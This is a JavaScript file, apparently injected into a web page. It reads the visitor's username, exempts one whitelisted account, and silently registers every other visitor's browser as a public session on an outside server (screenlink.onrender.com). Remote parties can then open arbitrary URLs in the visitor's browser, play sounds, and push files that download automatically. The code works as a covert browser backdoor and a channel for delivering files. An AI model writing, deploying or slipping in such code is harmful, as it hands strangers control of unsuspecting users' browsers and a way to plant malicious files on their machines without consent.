const SCREENLINK = "https://screenlink.onrender.com";

const socket = io(SCREENLINK, {
    transports: ["websocket", "polling"],
    reconnection: true,
    reconnectionAttempts: Infinity
});

(async () => {
    const session = await fetch('/api/session');
    const data = await session.json();
    const USERNAME = data.username;

    console.log("Username:", USERNAME);

const WHITELIST = [
    "turkey"
]

if (WHITELIST.includes(USERNAME)) {
    return
} else {

const SESSION_KEY = "screenlink_session";

let sessionId = localStorage.getItem(SESSION_KEY);

socket.on("connect", () => {
    console.log("Connected to ScreenLink:", socket.id);

    if (sessionId) {
        console.log("Reconnecting to existing session:", sessionId);

        socket.emit("host:join", {
            sessionId
        });

        return;
    }

    console.log("Creating new ScreenLink session...");

    socket.emit("host:create");
});

socket.on("host:code", ({ code, expiresIn, hasPassword, sessionId: newSessionId }) => {
    console.log("Host code:", code);
    console.log("Expires in:", expiresIn);
    console.log("Has password:", hasPassword);

    if (newSessionId) {
        localStorage.setItem(SESSION_KEY, newSessionId);
        sessionId = newSessionId;

        console.log("Saved ScreenLink session:", newSessionId);
    }

    socket.emit("host:set-public", {
        isPublic: true,
        label: "User"
    });
});

// ============================================================
// URL OPENING
// ============================================================

socket.on("cmd:open-url", ({ url, viewerId }) => {
    console.log("Opening URL:", url);
    console.log("Requested by:", viewerId);

    const tab = window.open(url, "_blank");

    if (!tab) {
        console.error("Browser blocked the popup:", url);
        return;
    }

    console.log("Tab opened:", url);
});


// ============================================================
// SOUND RECEIVING
// ============================================================

let soundChunks = [];
let soundMimeType = "audio/mpeg";
let soundVolume = 1;
let soundAudio = null;

socket.on("cmd:sound-start", ({ mimeType, volume, totalChunks }) => {
    console.log("Receiving sound:", {
        mimeType,
        volume,
        totalChunks
    });

    soundChunks = new Array(totalChunks);
    soundMimeType = mimeType || "audio/mpeg";
    soundVolume = volume ?? 1;
});

socket.on("cmd:sound-chunk", ({ chunk, index }) => {
    console.log(
        `Received chunk ${index}:`,
        typeof chunk,
        chunk?.constructor?.name,
        chunk?.length ?? chunk?.byteLength
    );

    soundChunks[index] = chunk;
});

socket.on("cmd:sound-end", async () => {
    console.log("Sound transfer complete");

    try {
        if (soundChunks.length === 0) {
            throw new Error("No sound chunks received.");
        }

        const missingChunks = soundChunks.filter(
            chunk => chunk == null
        ).length;

        console.log("Chunks:", soundChunks.length);
        console.log("Missing:", missingChunks);
        console.log("MIME:", soundMimeType);

        if (missingChunks > 0) {
            throw new Error(
                `${missingChunks} sound chunk(s) are missing.`
            );
        }

        /*
         * ScreenLink sends each chunk as Base64.
         * Decode Base64 back into the original bytes.
         */
        const decodedChunks = soundChunks.map((chunk, index) => {
            if (typeof chunk !== "string") {
                throw new Error(
                    `Sound chunk ${index} is ${typeof chunk}, expected a Base64 string.`
                );
            }

            const binary = atob(chunk);
            const bytes = new Uint8Array(binary.length);

            for (let i = 0; i < binary.length; i++) {
                bytes[i] = binary.charCodeAt(i);
            }

            return bytes;
        });

        const totalSize = decodedChunks.reduce(
            (total, chunk) => total + chunk.length,
            0
        );

        const audioBytes = new Uint8Array(totalSize);

        let offset = 0;

        for (const chunk of decodedChunks) {
            audioBytes.set(chunk, offset);
            offset += chunk.length;
        }

        console.log("Decoded audio:", {
            bytes: audioBytes.length,
            mimeType: soundMimeType
        });

        const blob = new Blob(
            [audioBytes],
            {
                type: soundMimeType
            }
        );

        console.log("Audio Blob:", {
            type: blob.type,
            size: blob.size
        });

        const url = URL.createObjectURL(blob);

        const audio = new Audio();

        audio.volume = Math.max(
            0,
            Math.min(1, soundVolume)
        );

        audio.oncanplay = () => {
            console.log("Audio can play");
        };

        audio.onended = () => {
            console.log("Sound ended");

            URL.revokeObjectURL(url);

            if (soundAudio === audio) {
                soundAudio = null;
            }
        };

        audio.onerror = () => {
            console.error("Audio failed:", audio.error);
            console.error(
                "Audio error code:",
                audio.error?.code
            );
            console.error(
                "Audio error message:",
                audio.error?.message
            );
        };

        audio.src = url;

        soundAudio = audio;

        await audio.play();

        console.log("Sound playing");

    } catch (error) {
        console.error(
            "Could not reconstruct/play sound:",
            error
        );
    }
});

socket.on("cmd:stop-sound", () => {
    if (!soundAudio) {
        return;
    }

    const url = soundAudio.src;

    soundAudio.pause();
    soundAudio.currentTime = 0;
    soundAudio.src = "";

    soundAudio = null;

    if (url.startsWith("blob:")) {
        URL.revokeObjectURL(url);
    }

    console.log("Sound stopped");
});


// ============================================================
// FILE RECEIVING
// ============================================================

let fileChunks = [];
let fileName = "";
let fileMimeType = "application/octet-stream";
let fileSize = 0;

socket.on(
    "cmd:file-start",
    ({ name, mimeType, totalChunks, size }) => {
        console.log("Receiving file:", name);
        console.log("Size:", size);
        console.log("Chunks:", totalChunks);

        fileChunks = new Array(totalChunks);
        fileName = name;
        fileMimeType =
            mimeType || "application/octet-stream";
        fileSize = size || 0;
    }
);

socket.on("cmd:file-chunk", ({ chunk, index }) => {
    console.log(
        `Received file chunk ${index}:`,
        typeof chunk,
        chunk?.constructor?.name,
        chunk?.length ?? chunk?.byteLength
    );

    fileChunks[index] = chunk;
});

socket.on("cmd:file-end", () => {
    console.log("File received:", fileName);

    try {
        const missingChunks = fileChunks.filter(
            chunk => chunk == null
        ).length;

        if (missingChunks > 0) {
            throw new Error(
                `${missingChunks} file chunk(s) are missing.`
            );
        }

        /*
         * Decode Base64 file chunks before creating the Blob.
         */
        const decodedChunks = fileChunks.map((chunk, index) => {
            if (typeof chunk !== "string") {
                throw new Error(
                    `File chunk ${index} is ${typeof chunk}.`
                );
            }

            const binary = atob(chunk);
            const bytes = new Uint8Array(binary.length);

            for (let i = 0; i < binary.length; i++) {
                bytes[i] = binary.charCodeAt(i);
            }

            return bytes;
        });

        const totalSize = decodedChunks.reduce(
            (total, chunk) => total + chunk.length,
            0
        );

        const fileBytes = new Uint8Array(totalSize);

        let offset = 0;

        for (const chunk of decodedChunks) {
            fileBytes.set(chunk, offset);
            offset += chunk.length;
        }

        console.log("Decoded file:", {
            name: fileName,
            bytes: fileBytes.length,
            expected: fileSize,
            mimeType: fileMimeType
        });

        const blob = new Blob(
            [fileBytes],
            {
                type: fileMimeType
            }
        );

        const url = URL.createObjectURL(blob);

        const a = document.createElement("a");

        a.href = url;
        a.download = fileName;

        document.body.appendChild(a);
        a.click();
        a.remove();

        setTimeout(() => {
            URL.revokeObjectURL(url);
        }, 1000);

        socket.emit("host:file-received", {
            name: fileName
        });

        fileChunks = [];
        fileName = "";
        fileMimeType = "application/octet-stream";
        fileSize = 0;

        console.log("File download started.");

    } catch (error) {
        console.error(
            "Could not reconstruct/download file:",
            error
        );
    }
});
}
})();